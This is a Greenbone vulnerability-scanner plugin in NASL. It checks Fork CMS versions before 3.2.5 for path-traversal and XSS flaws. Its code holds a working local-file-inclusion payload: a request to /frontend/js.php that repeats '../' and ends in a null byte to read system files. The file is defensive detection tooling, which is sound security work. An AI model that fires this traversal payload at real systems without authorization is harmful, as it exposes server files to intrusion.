# Copyright (C) 2012 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103433");
  script_version("2022-12-21T10:12:09+0000");
  script_tag(name:"last_modification", value:"2022-12-21 10:12:09 +0000 (Wed, 21 Dec 2022)");
  script_tag(name:"creation_date", value:"2012-02-22 14:53:24 +0100 (Wed, 22 Feb 2012)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2012-1209", "CVE-2012-1208", "CVE-2012-1207");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Fork CMS < 3.2.5 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Fork CMS is prone to multiple cross-site scripting (XSS)
  vulnerabilities and a local file include (LFI) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"An attacker may leverage these issues to execute arbitrary
  script code in the browser of an unsuspecting user in the context of the affected site, steal
  cookie-based authentication credentials, and open or run arbitrary files in the context of the
  webserver process.");

  script_tag(name:"affected", value:"Fork CMS version 3.2.4 and probably prior.");

  script_tag(name:"solution", value:"Update to version 3.2.5 or later.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51972");
  script_xref(name:"URL", value:"http://www.fork-cms.com/blog/detail/fork-cms-3-2-5-released");
  script_xref(name:"URL", value:"https://github.com/forkcms/forkcms/commit/c8ec9c58a6b3c46cdd924532c1de99bcda6072ed");
  script_xref(name:"URL", value:"https://github.com/forkcms/forkcms/commit/df75e0797a6540c4d656969a2e7df7689603b2cf");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port( default:80 );
if( ! http_can_host_php( port:port ) )
  exit( 0 );

files = traversal_files();

foreach dir( make_list_unique( "/", http_cgi_dirs( port:port ) ) ) {
  if( dir == "/" )
    dir = "";

  res = http_get_cache( port:port, item:dir + "/frontend/js.php" );
  if( ! res || res !~ "^HTTP/1\.[01] 200" )
    continue;

  foreach file( keys( files ) ) {
    url = dir + "/frontend/js.php?module=" + crap(data:"../", length:6 * 9) + files[file] +
          "%00&file=frontend.js&language=en";
    if( http_vuln_check( port:port, url:url, pattern:file ) ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
